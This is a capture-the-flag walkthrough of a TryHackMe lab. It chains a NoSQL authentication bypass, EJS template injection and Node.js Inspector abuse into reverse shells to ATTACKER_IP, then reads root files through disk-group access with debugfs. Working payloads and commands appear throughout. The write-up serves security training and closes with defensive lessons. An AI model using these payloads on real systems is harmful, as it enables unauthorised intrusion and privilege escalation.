# TryHackMe – Do Not Disturb

> Practical walkthrough of an authorised TryHackMe lab.

## Lab information

* **Event:** Hacker Holidays 2026
* **Category:** Web exploitation and Linux privilege escalation
* **Completed:** 5 August 2026
* **Status:** Private while the event is active

## Attack path

```text
NoSQL injection
→ Staff session
→ EJS template injection
→ Shell as poolside
→ Node.js Inspector
→ Shell as pipelinesvc
→ disk group
→ Raw filesystem access
```

## 1. Bypass authentication

The login request accepted a NoSQL operator inside the password parameter:

```text
username=attendant&password[$ne]=x
```

The `$ne` operator bypassed password verification and caused the server to return a valid session cookie for the `attendant` account.

<img width="1322" height="934" alt="NoSQL authentication bypass and session cookie response" src="https://github.com/user-attachments/assets/a2d4449f-9647-4561-95f2-838579391e31" />

*Figure 1: NoSQL injection returned a valid staff session cookie.*

The returned `connect.sid` value was manually added to the browser's cookie storage.

<img width="1314" height="227" alt="Staff session cookie added to browser storage" src="https://github.com/user-attachments/assets/c3a3ee40-69e8-499a-8404-a88658f2f768" />

*Figure 2: The staff session cookie was added to browser storage.*

Opening the following endpoint then provided access to the staff console:

```text
/staff
```

## 2. Exploit EJS template injection

The staff console rendered user-controlled input as an EJS template. This allowed server-side JavaScript and operating-system commands to be executed.

<img width="633" height="498" alt="EJS template injection in the staff console" src="https://github.com/user-attachments/assets/e0c32618-3c40-4e14-a037-cd723b0406f5" />

*Figure 3: User-controlled EJS templates allowed server-side command execution.*

Start a listener on the AttackBox:

```bash
nc -lvnp 4444
```

Enter the following template in the staff console, replacing `ATTACKER_IP` with the AttackBox IP:

```ejs
<%
process.getBuiltinModule('child_process').exec(
  "bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'"
);
%>
```

This returned a shell as `poolside`:

```bash
whoami
id
```

```text
poolside
uid=996(poolside) gid=996(poolside) groups=996(poolside)
```

Retrieve the user flag:

```bash
cat /home/poolside/user.txt
```

```text
THM{REDACTED}
```

## 3. Discover Node.js Inspector

Enumerate running processes:

```bash
ps auxww | grep -E 'node|inspect' | grep -v grep
```

This revealed a Node.js service running as `pipelinesvc` with its debugger enabled locally:

```text
pipelinesvc /usr/bin/node --inspect=127.0.0.1:9229 processor.js
```

<img width="1201" height="99" alt="Node.js Inspector process discovered during enumeration" src="https://github.com/user-attachments/assets/b0bbd400-fbd2-48e7-9e52-698ad1ad875c" />

*Figure 4: Process enumeration revealed Node.js Inspector on `127.0.0.1:9229`.*

Confirm the debugger endpoint:

```bash
curl -s http://127.0.0.1:9229/json/list
```

## 4. Execute commands as `pipelinesvc`

Connect to Node.js Inspector:

```bash
node inspect 127.0.0.1:9229
```

Open the debugger REPL:

```text
repl
```

Test command execution:

```javascript
process.mainModule
  .require('child_process')
  .execSync('id')
  .toString()
```

Result:

```text
uid=995(pipelinesvc) gid=995(pipelinesvc) groups=995(pipelinesvc),6(disk)
```

Start a second listener on the AttackBox:

```bash
nc -lvnp 5555
```

Create another reverse shell from the debugger:

```javascript
process.mainModule
  .require('child_process')
  .exec("bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/5555 0>&1'")
```

Confirm the new shell:

```bash
whoami
id
```

```text
pipelinesvc
uid=995(pipelinesvc) gid=995(pipelinesvc) groups=995(pipelinesvc),6(disk)
```

## 5. Read the root filesystem

The important discovery was that `pipelinesvc` belonged to the privileged `disk` group. This allowed direct access to the system's block devices.

Identify the block device containing `/`:

```bash
findmnt -no SOURCE /
```

Result:

```text
/dev/nvme0n1p1
```

Read the root flag directly from the ext4 filesystem:

```bash
debugfs -R 'cat /root/root.txt' /dev/nvme0n1p1 2>/dev/null
```
<img width="1035" height="98" alt="Root flag read from raw filesystem using debugfs" src="https://github.com/user-attachments/assets/b81986a3-a468-439d-be2e-35cc955389d3" />

*Figure 5: Membership in the `disk` group allowed `pipelinesvc` to read the protected root flag directly from the raw block device.*

A root shell was not required. Membership in the `disk` group allowed normal filesystem permissions to be bypassed by reading the underlying block device.

## Key lessons

* Validate the type and content of authentication parameters.
* Never render user-controlled content as an executable template.
* Disable Node.js Inspector in production.
* Treat membership in the Linux `disk` group as root-equivalent access.
* Continue process and privilege enumeration after obtaining an initial shell.

## Legal notice

All testing was performed inside an intentionally vulnerable and authorised TryHackMe lab.
